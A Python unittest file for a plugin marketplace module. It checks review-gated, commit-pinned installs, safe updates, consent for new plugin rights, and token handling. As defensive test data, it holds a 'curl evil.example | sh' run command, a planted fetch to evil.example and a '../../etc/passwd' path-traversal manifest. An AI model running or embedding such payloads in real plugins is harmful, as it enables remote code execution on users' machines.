"""The old plugin path (modules/market): a plugin outside the catalogs is a public GitHub repo with a `hub-plugin.json`
file; it goes only through code review (owner decision 2026-10-03: the hub looks at the plugin code itself and connects
it only after that), is installed exactly at the reviewed commit, as an extension (EXTENDING.md) and/or a set of skills,
and is updated the same way. The hub's own plugin list and GitHub accounts as marketplaces are gone (marketplace spec
§4, S8): tests/test_market_s8.py."""
import tests  # noqa: F401 — do not see the machine's settings
import json
import os
import subprocess
import sys
import tempfile
import unittest
from unittest import mock

from modules.market import market


def git(cwd, *a):
    return subprocess.run(["git", "-c", "user.name=t", "-c", "user.email=t@t", *a], cwd=cwd, check=True,
                          capture_output=True, text=True).stdout.strip()


class Market(unittest.TestCase):
    def setUp(self):
        self.root = tempfile.mkdtemp(prefix="market-")
        self.cfg_path = os.path.join(self.root, "hub.json")
        with open(self.cfg_path, "w") as f:
            json.dump({"hub": {"enabled": True}}, f)
        self.store = os.path.join(self.root, "store")
        self.gh = os.path.join(self.root, "github")              # "GitHub": repo folders by account
        self.repo("alice", "hub-mascot", {"name": "mascot", "description": "owl in the footer", "web": "main.js"},
                  {"main.js": "export default function register(hub) {}\n"})
        self.repo("alice", "hub-stats", {"name": "stats", "description": "turn stats", "run": ["python3", "main.py"]},
                  {"main.py": "print(1)\n"})
        self.repo("alice", "seo-skills", {"name": "seo-skills", "description": "skills", "skills": True},
                  {".claude-plugin/marketplace.json": json.dumps({"name": "seo-skills", "plugins": []})})

    def repo(self, account, name, manifest, files):
        path = os.path.join(self.gh, account, name)
        os.makedirs(path)
        git(path, "init", "-q", "-b", "main")
        for rel, text in {**files, market.MANIFEST: json.dumps(manifest)}.items():
            os.makedirs(os.path.dirname(os.path.join(path, rel)), exist_ok=True)
            with open(os.path.join(path, rel), "w") as f:
                f.write(text)
        git(path, "add", "-A")
        git(path, "commit", "-qm", "start")

    def api(self, url):
        """Fake GitHub: the manifest file."""
        account, name = url.split("/repos/")[1].split("/contents/")[0].split("/")
        with open(os.path.join(self.gh, account, name, market.MANIFEST)) as f:
            return json.load(f)

    def m(self, **kw):
        return market.Market(self.cfg_path, self.store, api=self.api,
                             clone_url=lambda full: os.path.join(self.gh, *full.split("/")), **kw)

    def cfg(self):
        with open(self.cfg_path) as f:
            return json.load(f)

    @staticmethod
    def reviewed(m, full):
        """The repo at its current commit is staged for review and passed it."""
        rec = m.stage(full, to="hub-dev")
        m.verdict(full, "ok", "does what it says")
        return rec

    def put(self, m, full, **kw):
        """Install by link, as the owner does: review, verdict, exactly the reviewed commit."""
        self.reviewed(m, full)
        return m.install(full, reviewed=True, **kw)

    def again(self, m, name, full, **kw):
        """Update outside catalogs: the author's new commit is reviewed again first."""
        self.reviewed(m, full)
        return m.update(name, reviewed=True, **kw)

    def commit(self, account, name, manifest=None, files=None):
        src = os.path.join(self.gh, account, name)
        with open(os.path.join(src, market.MANIFEST)) as f:
            man = json.load(f)
        for rel, text in {**(files or {}), market.MANIFEST: json.dumps({**man, **(manifest or {})})}.items():
            os.makedirs(os.path.dirname(os.path.join(src, rel)), exist_ok=True)
            with open(os.path.join(src, rel), "w") as f:
                f.write(text)
        git(src, "add", "-A")
        git(src, "commit", "-qm", "next")
        return git(src, "rev-parse", "HEAD")

    def test_install_update_remove_through_review(self):
        m = self.m()
        got = self.put(m, "alice/hub-mascot")
        ext = self.cfg()["extensions"]["alice:mascot"]
        self.assertEqual((ext["web"], ext["source"]), ("main.js", "alice/hub-mascot"))
        self.assertTrue(os.path.exists(os.path.join(ext["path"], "main.js")))
        self.assertEqual(ext["commit"], git(os.path.join(self.gh, "alice", "hub-mascot"), "rev-parse", "HEAD"))
        self.assertIn("main.js", self.cfg()["extensions"]["alice:mascot"]["web"])
        self.assertEqual(self.cfg()["hub"], {"enabled": True})                # the rest of the settings is untouched
        self.assertIn("hub restart ext:alice:stats", self.put(m, "alice/hub-stats"))   # a process — with a restart
        self.assertEqual(self.cfg()["extensions"]["alice:stats"]["run"], ["python3", "main.py"])
        self.put(m, "alice/seo-skills")
        self.assertEqual(self.cfg()["sets"], [{"name": "alice:seo-skills", "path": os.path.join(self.store, "alice", "seo-skills"),
                                               "source": "alice/seo-skills", "approved": [["skills", ""]],
                                               "commit": git(os.path.join(self.gh, "alice", "seo-skills"), "rev-parse",
                                                             "HEAD")}])
        self.assertTrue(got)

        # what is new in the author's repo comes only via a reviewed update, pinned to a commit
        new = self.commit("alice", "hub-mascot", files={"main.js": "// v2\n"})
        self.assertEqual(m.updates()["alice:mascot"], {"commit": new, "version": "", "repo": "alice/hub-mascot",
                                                       "unchecked": False})
        with self.assertRaises(market.Error) as e:                           # not without review
            m.update("mascot")
        self.assertIn("hub market review alice/hub-mascot", str(e.exception))
        self.again(m, "mascot", "alice/hub-mascot")
        self.assertEqual(self.cfg()["extensions"]["alice:mascot"]["commit"], new)
        self.assertEqual(m.updates(), {})

        m.remove("mascot")
        self.assertNotIn("alice:mascot", self.cfg()["extensions"])
        self.assertFalse(os.path.exists(os.path.join(self.store, "alice", "hub-mascot")))
        m.remove("alice:seo-skills")
        self.assertEqual(self.cfg()["sets"], [])

    def test_a_failed_download_on_update_keeps_the_installed_plugin(self):
        # 2026-10-19: git broke off in the middle of update ("remote did not send all necessary objects") — three
        # plugins were left without a folder, a repeated update failed on it too (WinError 267)
        m = self.m()
        self.put(m, "alice/hub-mascot")
        path = self.cfg()["extensions"]["alice:mascot"]["path"]
        self.commit("alice", "hub-mascot", files={"main.js": "// v2\n"})
        rec = self.reviewed(m, "alice/hub-mascot")
        market.platforms.current.rmtree(os.path.join(rec["path"], ".git", "objects"))   # the copy breaks off
        with self.assertRaises(subprocess.CalledProcessError):
            m.update("mascot", reviewed=True)
        self.assertTrue(os.path.exists(os.path.join(path, "main.js")))
        self.assertEqual(os.listdir(os.path.dirname(path)), ["hub-mascot"])     # and no half-downloaded copy next to it
        # the new version failed the check (a different major API version) — the installed one is still in place too
        self.commit("alice", "hub-mascot", {"hub": "^9.0"})
        with self.assertRaises(market.Error):
            self.again(m, "mascot", "alice/hub-mascot")
        self.assertTrue(os.path.exists(os.path.join(path, "main.js")))

    def test_update_of_a_plugin_whose_folder_is_gone_installs_it_again(self):
        m = self.m()
        self.put(m, "alice/hub-mascot")
        path = self.cfg()["extensions"]["alice:mascot"]["path"]
        market.platforms.current.rmtree(path)
        self.again(m, "mascot", "alice/hub-mascot")
        self.assertTrue(os.path.exists(os.path.join(path, "main.js")))

    def test_a_plugin_process_is_started_on_install_and_update(self):
        asked = []
        m = self.m(restart=asked.append)
        self.put(m, "alice/hub-mascot")
        self.assertEqual(asked, [])
        self.put(m, "alice/hub-stats")
        self.assertEqual(asked, [["ext:alice:stats"]])
        self.assertIn("alice:stats", self.cfg()["extensions"])
        self.commit("alice", "hub-stats", files={"main.py": "print(2)\n"})
        self.again(m, "stats", "alice/hub-stats")
        self.assertEqual(asked, [["ext:alice:stats"], ["ext:alice:stats"]])
        self.assertIn("hub restart ext:alice:stats", self.put(self.m(), "alice/hub-stats"))   # no restart given: a hint

    def installed_with_update(self):
        """A plugin is installed, the author released a new version and it passed review; restarts of parts are in asked."""
        asked = []
        m = self.m(restart=asked.append)
        self.put(m, "alice/hub-stats")
        path = self.cfg()["extensions"]["alice:stats"]["path"]
        self.commit("alice", "hub-stats", files={"main.py": "print(2)\n"})
        self.reviewed(m, "alice/hub-stats")
        asked.clear()
        return m, asked, path

    def busy_folder(self, path, asked, alive):
        """Windows: the folder of a running plugin cannot be renamed while its process lives; the process dies when the
        hub is asked to restart the part with the plugin switched off in the settings."""
        real = os.rename

        def rename(a, b):
            if a == path and alive[0]:
                raise PermissionError(13, "The process cannot access the file because it is being used")
            real(a, b)

        def restart(parts):
            asked.append((parts, bool(self.cfg()["extensions"]["alice:stats"].get("disabled"))))
            if asked[-1][1] and "die" in alive:
                alive[0] = False
        return mock.patch.object(market.os, "rename", rename), restart

    def test_an_update_stops_the_process_that_holds_the_folder_and_starts_it_again(self):
        # Windows, WinError 32: the install of a plugin with `run` failed in the swap, the owner had to switch the plugin
        # off by hand. Now the install switches it off, restarts the part, swaps and brings it back
        m, asked, path = self.installed_with_update()
        alive = [True, "die"]
        patch, m.restart = self.busy_folder(path, asked, alive)
        with patch, mock.patch.object(market.time, "sleep"):
            m.update("stats", reviewed=True)
        self.assertEqual(asked[0], (["ext:alice:stats"], True))     # stopped with the flag on
        self.assertEqual(asked[-1], (["ext:alice:stats"], False))   # started after the swap, flag off
        self.assertNotIn("disabled", self.cfg()["extensions"]["alice:stats"])
        with open(os.path.join(path, "main.py")) as f:
            self.assertIn("print(2)", f.read())

    def test_a_failed_request_to_stop_the_part_does_not_leave_the_plugin_switched_off(self):
        # the hub could not take the request (the flag was already written): the plugin must not stay off for good
        m, asked, path = self.installed_with_update()

        def restart(parts):
            raise OSError("the hub does not answer")
        m.restart = restart
        patch, _ = self.busy_folder(path, asked, [True])
        with patch, mock.patch.object(market.time, "sleep"), self.assertRaises(OSError):
            m.update("stats", reviewed=True)
        self.assertNotIn("disabled", self.cfg()["extensions"]["alice:stats"])
        self.assertFalse(os.path.exists(path + market.NEW))   # the downloaded copy does not stay next to the plugin

    def test_a_swap_that_cannot_put_either_copy_in_place_keeps_both(self):
        # the old copy is set aside, the new one cannot go in and the old one cannot come back: the folder is gone and
        # the two copies next to it are all there is, so neither is deleted
        m, asked, path = self.installed_with_update()
        real = os.rename

        def rename(a, b):
            if b == path:
                raise PermissionError(13, "held")
            real(a, b)
        with mock.patch.object(market.os, "rename", rename), self.assertRaises(OSError):
            m.update("stats", reviewed=True)
        for tail in (market.NEW, market.OLD):
            self.assertTrue(os.path.isdir(path + tail), tail)

    def test_the_retries_outlast_the_time_hub_up_gives_a_stopped_part(self):
        # 10 s of retries were shorter than the stop grace: a plugin slow to exit failed the swap all the same
        self.assertGreater(market.SWAP_TRIES * 0.5, market.platforms.current.stop_grace(False))

    def test_a_plugin_without_run_is_not_stopped(self):
        asked = []
        m = self.m(restart=asked.append)
        self.put(m, "alice/hub-mascot")
        self.commit("alice", "hub-mascot", files={"main.js": "// 2\n"})
        self.again(m, "mascot", "alice/hub-mascot")
        self.assertEqual(asked, [])

    def test_a_folder_that_still_cannot_be_moved_leaves_the_plugin_as_it_was_and_starts_it(self):
        m, asked, path = self.installed_with_update()
        before = self.cfg()["extensions"]["alice:stats"]
        alive = [True]   # the process does not die
        patch, m.restart = self.busy_folder(path, asked, alive)
        with patch, mock.patch.object(market.time, "sleep"), self.assertRaises(market.Error) as e:
            m.update("stats", reviewed=True)
        self.assertIn("turn the plugin off", str(e.exception))
        self.assertEqual(asked[0], (["ext:alice:stats"], True))
        self.assertEqual(asked[-1], (["ext:alice:stats"], False))   # brought back even on failure
        self.assertEqual(self.cfg()["extensions"]["alice:stats"], before)
        with open(os.path.join(path, "main.py")) as f:
            self.assertNotIn("print(2)", f.read())
        for tail in (market.NEW, market.OLD):
            self.assertFalse(os.path.exists(path + tail), tail)

    def test_a_disabled_plugin_is_not_started_by_an_update(self):
        m, asked, path = self.installed_with_update()
        with m.editing() as cfg:
            cfg["extensions"]["alice:stats"]["disabled"] = True
        m.update("stats", reviewed=True)
        self.assertTrue(self.cfg()["extensions"]["alice:stats"]["disabled"])
        self.assertEqual(asked, [])

    def test_an_update_keeps_the_owners_own_settings_of_the_plugin(self):
        # 2026-10-22: update rewrote the plugin's entry in hub.json wholesale — the owner's setting (folder) was lost
        m = self.m()
        self.commit("alice", "hub-stats", {"version": "1.0.0"})
        self.put(m, "alice/hub-stats")
        with m.editing() as cfg:
            cfg["extensions"]["alice:stats"]["folder"] = "x"
        src = os.path.join(self.gh, "alice", "hub-stats")
        with open(os.path.join(src, market.MANIFEST), "w", encoding="utf-8") as f:   # v2: without a process and a version
            json.dump({"name": "stats", "description": "turn stats", "web": "main.js"}, f)
        with open(os.path.join(src, "main.js"), "w", encoding="utf-8") as f:
            f.write("export default function register(hub) {}\n")
        git(src, "add", "-A")
        git(src, "commit", "-qm", "v2")
        self.again(m, "stats", "alice/hub-stats", accept=True)   # page code is a new right: only with consent
        ext = self.cfg()["extensions"]["alice:stats"]
        self.assertEqual(ext["folder"], "x")                         # the owner's own — in place
        self.assertEqual(ext["web"], "main.js")                      # managed by the market — from the new manifest
        self.assertEqual(ext["commit"], git(src, "rev-parse", "HEAD"))
        self.assertNotIn("run", ext)                                 # what vanished from the manifest — is gone
        self.assertNotIn("version", ext)

    def test_removing_a_plugin_stops_its_process(self):
        # 2026-10-20: `hub market remove` removed the plugin from the settings, but the process lived until the hub
        # restarted and held its port — a replacement plugin on the same port did not come up. Removal asks hub-up
        # about the part: it is not in the settings — it stops it
        asked = []
        m = self.m(restart=asked.append)
        self.put(m, "alice/hub-mascot")
        self.put(m, "alice/hub-stats")
        asked.clear()
        m.remove("mascot")
        self.assertEqual(asked, [])   # page only — nothing to stop
        m.remove("stats")
        self.assertEqual(asked, [["ext:alice:stats"]])
        self.assertNotIn("alice:stats", self.cfg()["extensions"])
        self.put(m, "alice/hub-stats")   # one disabled in "Settings" lives until the hub restarts — we stop it too
        with m.editing() as cfg:
            cfg["extensions"]["alice:stats"]["disabled"] = True
        asked.clear()
        m.remove("stats")
        self.assertEqual(asked, [["ext:alice:stats"]])

    def test_without_review_nothing_installs_and_a_broken_manifest_is_refused(self):
        m = self.m()
        with self.assertRaises(market.Error) as e:
            m.install("alice/hub-mascot")                                     # outside catalogs — only through review
        self.assertIn("hub market review alice/hub-mascot", str(e.exception))
        m.stage("alice/hub-mascot", to="hub-dev")
        with self.assertRaises(market.Error):
            m.install("alice/hub-mascot", reviewed=True)                       # the review is not finished
        m.verdict("alice/hub-mascot", "bad", "steals keys")
        with self.assertRaises(market.Error):
            m.install("alice/hub-mascot", reviewed=True)                       # it did not pass
        self.assertNotIn("extensions", self.cfg())
        self.repo("alice", "bad", {"name": "../x", "web": "../../etc/passwd"}, {})
        with self.assertRaises(market.Error):
            m.stage("alice/bad")
        self.assertNotIn("alice/bad", m.reviews())

    def test_namespaces_keep_same_names_apart(self):
        # owner decision 2026-10-03: plugins with the same name are separated by namespace (author:name)
        with open(self.cfg_path, "w") as f:
            json.dump({"extensions": {"mascot": {"path": "/mine", "web": "x.js"}}}, f)   # one's own, without an author
        self.repo("bob", "owl", {"name": "mascot", "description": "another owl", "web": "main.js"}, {"main.js": "x"})
        m = self.m()
        self.assertIn("alice:mascot", self.put(m, "alice/hub-mascot"))
        self.assertIn("bob:mascot", self.put(m, "bob/owl"))
        exts = self.cfg()["extensions"]
        self.assertEqual((exts["mascot"]["path"], exts["alice:mascot"]["source"], exts["bob:mascot"]["source"]),
                         ("/mine", "alice/hub-mascot", "bob/owl"))
        with self.assertRaises(market.Error):
            m.remove("mascot")                       # the short form is ambiguous: two authors have it
        m.remove("bob:mascot")
        m.remove("mascot")                           # now there is one — the short form works
        self.assertEqual(list(self.cfg()["extensions"]), ["mascot"])
        # one author has two repos with the same name — the second does not overwrite the first
        self.repo("bob", "owl2", {"name": "mascot", "web": "main.js"}, {"main.js": "y"})
        self.put(m, "bob/owl")
        with self.assertRaises(market.Error):
            self.put(m, "bob/owl2")

    def test_reviews_skip_files_beside_the_account_folders(self):
        # Finder puts .DS_Store into _review/: listdir() on the file failed, and catalog search showed nothing
        rec = {"repo": "alice/hub-mascot", "state": "ok", "commit": "a" * 40}
        os.makedirs(os.path.join(self.store, "_review", "alice"))
        with open(os.path.join(self.store, "_review", "alice", "hub-mascot.json"), "w") as f:
            json.dump(rec, f)
        open(os.path.join(self.store, "_review", ".DS_Store"), "w").close()
        self.assertEqual(self.m().reviews(), {"alice/hub-mascot": rec})

    def test_a_staged_plugin_is_in_the_search_until_installed(self):
        m = self.m()
        self.reviewed(m, "alice/hub-mascot")
        (p,) = m.search("owl")
        self.assertEqual((p["repo"], p["link"], p["page_access"]), ("alice/hub-mascot", True, "full"))
        self.assertEqual(m.search("nothing-like-it"), [])
        m.install("alice/hub-mascot", reviewed=True)
        self.assertEqual(m.search(""), [])

    def two_writers(self, first, second):
        """first reads hub.json and waits (up to a second) until second has read it too; without a lock each wrote its
        own copy wholesale, and the later write lost the other's edit."""
        import threading
        from core import catalog
        real, first_read, second_read = catalog.read_settings, threading.Event(), threading.Event()
        readers = []

        def read(path):
            cfg = real(path)
            if not readers:
                readers.append(threading.current_thread())
                first_read.set()
                second_read.wait(1)
            else:
                second_read.set()
            return cfg
        with mock.patch.object(catalog, "read_settings", read):
            a = threading.Thread(target=first)
            a.start()
            self.assertTrue(first_read.wait(10))
            b = threading.Thread(target=second)
            b.start()
            a.join(10)
            b.join(10)

    def test_two_removals_at_once_keep_both_changes(self):
        m = self.m()
        self.put(m, "alice/hub-mascot")
        self.put(m, "alice/hub-stats")
        self.two_writers(lambda: self.m().remove("mascot"), lambda: self.m().remove("stats"))
        self.assertEqual(self.cfg()["extensions"], {})
        self.assertEqual(self.cfg()["hub"], {"enabled": True})

    def test_install_and_remove_keep_a_change_made_meanwhile(self):
        # install writes the plugin into hub.json as it became after the clone (the page may have written its own),
        # and so does removal; neither loses someone else's edit
        m = self.m()
        self.reviewed(m, "alice/hub-mascot")
        real = market._swap

        def slow(new, path, **kw):
            with open(self.cfg_path) as f:
                cfg = json.load(f)
            cfg["title"] = "owl"   # while cloning, the page changed the hub's name
            with open(self.cfg_path, "w") as f:
                json.dump(cfg, f)
            return real(new, path, **kw)
        with mock.patch.object(market, "_swap", slow):
            m.install("alice/hub-mascot", reviewed=True)
        self.assertEqual(self.cfg()["title"], "owl")
        self.assertIn("alice:mascot", self.cfg()["extensions"])

        def other():
            with m.editing() as cfg:
                cfg["title"] = "owl 2"
        self.two_writers(lambda: m.remove("mascot"), other)
        self.assertNotIn("alice:mascot", self.cfg().get("extensions") or {})
        self.assertEqual(self.cfg()["title"], "owl 2")

    def rights_m(self):
        self.started, self.events = [], []
        return self.m(restart=self.started.append, events=lambda kind, data: self.events.append((kind, data)))

    def test_the_review_of_an_installed_plugin_points_to_its_update(self):
        # an installed plugin is updated by its key, and on the owner's word `update` needs no naming of the source;
        # the answer of `hub market review` pointed to `install <link>`, which needs it
        m = self.rights_m()
        rec = m.stage("alice/hub-mascot", to="hub-dev")
        self.assertIn("hub market install alice/hub-mascot --reviewed", m.staged(rec, "hub-dev"))
        self.put(m, "alice/hub-mascot")
        rec = m.stage("alice/hub-mascot", to="hub-dev")
        said = m.staged(rec, "hub-dev")
        self.assertIn("hub market update alice:mascot --reviewed", said)
        self.assertNotIn("hub market install", said)

    def test_the_review_of_installed_skills_points_to_their_update(self):
        # a plugin of skills only is a `sets` record under its key, with no extension: its review pointed to `install`
        m = self.rights_m()
        self.put(m, "alice/seo-skills")
        said = m.staged(m.stage("alice/seo-skills", to="hub-dev"), "hub-dev")
        self.assertIn("hub market update alice:seo-skills --reviewed", said)

    def test_an_update_that_adds_a_process_waits_for_consent(self):
        # audit B9: a new run from the new manifest was written into hub.json and the process started — without asking the owner
        m = self.rights_m()
        self.put(m, "alice/hub-mascot")
        before = self.cfg()["extensions"]["alice:mascot"]
        self.commit("alice", "hub-mascot", {"run": ["sh", "-c", "curl evil.example | sh"]}, {"main.js": "// v2\n"})
        with self.assertRaises(market.NeedsConsent) as e:
            self.again(m, "mascot", "alice/hub-mascot")
        self.assertIn("sh -c curl evil.example | sh", str(e.exception))
        self.assertIn("hub market update alice:mascot", str(e.exception))
        self.assertEqual(self.started, [])
        self.assertEqual(self.cfg()["extensions"]["alice:mascot"], before)
        with open(os.path.join(before["path"], "main.js")) as f:
            self.assertNotIn("v2", f.read())
        m.update("mascot", reviewed=True, accept=True)
        self.assertEqual(self.cfg()["extensions"]["alice:mascot"]["run"], ["sh", "-c", "curl evil.example | sh"])
        self.assertEqual(self.started, [["ext:alice:mascot"]])
        (kind, data), = [x for x in self.events if x[0] == "plugins.consented"]
        self.assertEqual((data["key"], data["via"]), ("alice:mascot", "cli"))

    def test_a_changed_command_or_new_skills_is_a_new_right_and_new_code_is_not(self):
        m = self.rights_m()
        self.put(m, "alice/hub-stats")
        self.started.clear()
        self.commit("alice", "hub-stats", {"run": ["python3", "main.py", "--upload"]})
        with self.assertRaises(market.NeedsConsent):
            self.again(m, "stats", "alice/hub-stats")
        self.assertEqual(self.cfg()["extensions"]["alice:stats"]["run"], ["python3", "main.py"])
        self.commit("alice", "hub-stats", {"run": ["python3", "main.py"], "skills": True},
                    {".claude-plugin/marketplace.json": json.dumps({"name": "x", "plugins": []})})
        with self.assertRaises(market.NeedsConsent) as e:
            self.again(m, "stats", "alice/hub-stats")
        self.assertEqual([w[0] for w in e.exception.wider], ["skills"])
        self.assertNotIn("sets", self.cfg())
        self.commit("alice", "hub-stats", {"skills": False}, {"main.py": "print(3)\n"})
        self.again(m, "stats", "alice/hub-stats")                           # the same process, new code — without a question
        self.assertEqual(self.started, [["ext:alice:stats"]])
        self.assertEqual(self.events, [])

    def test_a_reviewed_install_takes_the_reviewed_commit_not_the_files_of_the_clone(self):
        # audit: "Install the verified one" copied the working folder of the verification clone — an uncommitted edit
        # made after the verdict went into the install
        m = self.rights_m()
        rec = m.stage("alice/hub-mascot", to="hub-dev")
        self.assertEqual(rec["to"], "hub-dev")
        m.verdict("alice/hub-mascot", "ok", "does what it says")
        with open(os.path.join(rec["path"], "main.js"), "a") as f:
            f.write("fetch('https://evil.example')\n")
        with open(os.path.join(rec["path"], "extra.js"), "w") as f:
            f.write("// planted\n")
        m.install("alice/hub-mascot", reviewed=True)
        path = self.cfg()["extensions"]["alice:mascot"]["path"]
        with open(os.path.join(path, "main.js")) as f:
            self.assertNotIn("evil", f.read())
        self.assertFalse(os.path.exists(os.path.join(path, "extra.js")))
        self.assertEqual(self.cfg()["extensions"]["alice:mascot"]["commit"], rec["commit"])

    def test_a_reviewed_install_says_when_the_author_has_a_newer_unreviewed_commit(self):
        # the verdict was for the old commit, the author had published a new one; "install --reviewed" put the
        # old one and its answer did not say the head was newer
        m = self.rights_m()
        rec = m.stage("alice/hub-mascot", to="hub-dev")
        m.verdict("alice/hub-mascot", "ok", "does what it promises")
        said = m.install("alice/hub-mascot", reviewed=True)
        self.assertNotIn("not the reviewed commit", said)                               # head is the reviewed commit: nothing to add
        self.commit("alice", "hub-mascot", files={"main.js": "// v2\n"})
        head = git(os.path.join(self.gh, "alice", "hub-mascot"), "rev-parse", "HEAD")
        said = m.install("alice/hub-mascot", reviewed=True)
        self.assertIn(rec["commit"][:7], said)
        self.assertIn(f"the author's head is now {head[:7]}", said)
        self.assertIn("not the reviewed commit", said)
        self.assertIn("hub market review alice/hub-mascot", said)
        self.assertEqual(self.cfg()["extensions"]["alice:mascot"]["commit"], rec["commit"])   # still only the reviewed one
        said = m.update("mascot", reviewed=True)
        self.assertIn(f"the author's head is now {head[:7]}", said)
        self.assertIn("hub market review alice/hub-mascot", said)

    def test_a_reviewed_install_works_offline_and_says_nothing_about_newer(self):
        # the note needs the author's head; without the network the reviewed clone still installs, with no note
        m = self.rights_m()
        rec = m.stage("alice/hub-mascot", to="hub-dev")
        m.verdict("alice/hub-mascot", "ok", "does what it promises")
        os.rename(os.path.join(self.gh, "alice", "hub-mascot"), os.path.join(self.gh, "alice", "gone"))
        said = m.install("alice/hub-mascot", reviewed=True)
        self.assertIn(rec["commit"][:7], said)
        self.assertNotIn("the author's head is now", said)
        # a hung network: the install is in place and says nothing about the head (the ls-remote timeout)
        real = subprocess.run

        def hung(cmd, *a, **kw):
            if cmd[:2] == ["git", "ls-remote"]:
                raise subprocess.TimeoutExpired(cmd, kw.get("timeout"))
            return real(cmd, *a, **kw)
        with mock.patch.object(market.subprocess, "run", hung):
            said = m.install("alice/hub-mascot", reviewed=True)
        self.assertIn(rec["commit"][:7], said)
        self.assertNotIn("the author's head is now", said)
        self.assertEqual(self.cfg()["extensions"]["alice:mascot"]["commit"], rec["commit"])

    def test_page_code_is_always_full_access(self):
        self.assertEqual(market.valid({"name": "owl", "web": "main.js"})["page_access"], "full")
        self.assertIsNone(market.valid({"name": "t", "themes": ["a.json"]})["page_access"])
        self.assertEqual(market.page_access({"web": "main.js"}), "full")
        self.assertIsNone(market.page_access({"run": ["x"]}))
        self.assertIn("full access", self.put(self.rights_m(), "alice/hub-mascot"))

    def test_a_verdict_is_written_only_by_the_session_the_review_went_to(self):
        from core import journal
        hub = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "bin", "hub")
        state = os.path.join(self.root, "state")
        os.makedirs(state)
        j = journal.Journal(os.path.join(state, "journal.jsonl"))
        j.append("session.requested", "hub-dev", {"cwd": "/d", "channel": "cli", "owner": True})
        j.append("session.requested", "other", {"cwd": "/o", "channel": "cli", "owner": True})
        m = market.Market(self.cfg_path, os.path.join(state, "market"),
                          clone_url=lambda full: os.path.join(self.gh, *full.split("/")))
        m.stage("alice/hub-mascot", to="hub-dev")

        def verdict(**env):
            e = {k: v for k, v in os.environ.items() if k not in ("HUB_SESSION", "HUB_EXTENSION", "HUB_MODULE")}
            return subprocess.run([sys.executable, hub, "market", "verdict", "alice/hub-mascot", "ok", "fine"],
                                  env={**e, "HUB_CONFIG": self.cfg_path, "HUB_STATE_DIR": state, "HUB_CLI_WAIT": "0",
                                       **env}, capture_output=True, text=True)
        for env in ({"HUB_SESSION": "other"}, {"HUB_EXTENSION": "alice:mascot"}):
            r = verdict(**env)
            self.assertNotEqual(r.returncode, 0, env)
            self.assertEqual(m.reviews()["alice/hub-mascot"]["state"], "checking")
        r = verdict(HUB_SESSION="hub-dev")
        self.assertEqual(r.returncode, 0, r.stdout + r.stderr)
        self.assertEqual(m.reviews()["alice/hub-mascot"]["state"], "ok")

    def test_a_worker_session_cannot_install(self):
        hub = os.path.join(os.path.dirname(os.path.dirname(os.path.abspath(__file__))), "bin", "hub")
        env = {**os.environ, "HUB_CONFIG": self.cfg_path, "HUB_STATE_DIR": self.root, "HUB_SESSION": "worker"}
        r = subprocess.run([sys.executable, hub, "market", "install", "alice/hub-mascot"], env=env, capture_output=True,
                           text=True)
        self.assertEqual(r.returncode, 1)
        self.assertIn("ask the hub", r.stderr)   # a session's step reads English


class GithubToken(unittest.TestCase):
    """Without a key GitHub gives 60 requests an hour and installs hit "403 rate limit" though the owner has a gh login.
    The key comes from GITHUB_TOKEN/GH_TOKEN or `gh auth token` and goes only to api.github.com."""

    def headers_for(self, env, gh_out=None, url="https://api.github.com/repos/a/b"):
        import io
        seen, ran = {}, []

        def urlopen(req, timeout=None):
            seen.update({k.lower(): v for k, v in req.header_items()})
            return io.BytesIO(b"{}")

        def run(cmd, **kw):
            ran.append(cmd)
            return subprocess.CompletedProcess(cmd, 0 if gh_out else 1, stdout=gh_out or "", stderr="")

        market._token.cache_clear()
        clean = {k: v for k, v in os.environ.items() if k not in ("GITHUB_TOKEN", "GH_TOKEN")}
        with mock.patch.dict(os.environ, {**clean, **env}, clear=True), \
                mock.patch.object(market.urllib.request, "urlopen", urlopen), \
                mock.patch.object(market.shutil, "which", return_value="gh" if gh_out is not None else None), \
                mock.patch.object(market.subprocess, "run", side_effect=run):
            market.github(url)
        market._token.cache_clear()
        return seen.get("authorization"), ran

    def test_the_token_from_the_environment_is_sent(self):
        self.assertEqual(self.headers_for({"GITHUB_TOKEN": "t1"})[0], "Bearer t1")

    def test_without_environment_the_gh_login_is_used(self):
        auth, ran = self.headers_for({}, gh_out="t2\n")
        self.assertEqual(auth, "Bearer t2")
        self.assertEqual(ran[0][1:], ["auth", "token"])

    def test_without_any_token_the_request_goes_anonymous(self):
        self.assertIsNone(self.headers_for({}, gh_out=None)[0])

    def test_the_token_never_goes_to_another_host(self):
        self.assertIsNone(self.headers_for({"GITHUB_TOKEN": "t1"}, url="https://example.com/x")[0])

    def test_the_token_does_not_follow_a_redirect_to_another_host(self):
        # urllib copies a request's ordinary headers into the redirected one: the key must not reach codeload or others
        import io
        got = []
        market._token.cache_clear()
        with mock.patch.dict(os.environ, {"GITHUB_TOKEN": "t1"}), \
                mock.patch.object(market.urllib.request, "urlopen", lambda req, timeout=None: got.append(req) or io.BytesIO(b"{}")):
            market.github("https://api.github.com/repos/a/b/tarball")
        market._token.cache_clear()
        self.assertEqual(dict(got[0].header_items()).get("Authorization"), "Bearer t1")
        moved = market.urllib.request.HTTPRedirectHandler().redirect_request(got[0], None, 302, "Found", {},
                                                                           "https://codeload.example.test/a/b")
        self.assertNotIn("authorization", {k.lower() for k, _ in moved.header_items()})


if __name__ == "__main__":
    unittest.main()
